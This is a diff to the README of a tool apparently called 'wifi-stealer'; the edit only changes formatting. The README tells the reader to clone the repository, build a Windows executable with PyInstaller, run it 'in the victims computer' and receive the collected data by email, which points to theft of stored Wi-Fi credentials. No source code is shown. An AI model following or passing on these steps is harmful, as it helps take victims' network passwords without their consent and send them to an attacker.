@@ -4,7 +4,7 @@
 
 ### Instructions 
 
-**git clone https://github.com/m4sk0fm3/wifi-stealer.git
+	git clone https://github.com/m4sk0fm3/wifi-stealer.git
 
 	First of all, make sure you have Python 3.6 installed, and Pyinstaller.
 		Then, run install.py.
@@ -15,7 +15,8 @@
 	after will gonna write a .exe into dist package.
 
 	run in the victims computer, and will gonna receive a email with the data collect.
-**Obs : Only works on English windows, trying update for Brazilian Windows ...
+	
+	Obs : Only works on English windows, trying update for Brazilian Windows ...
 
 
 ### Hugs ... 
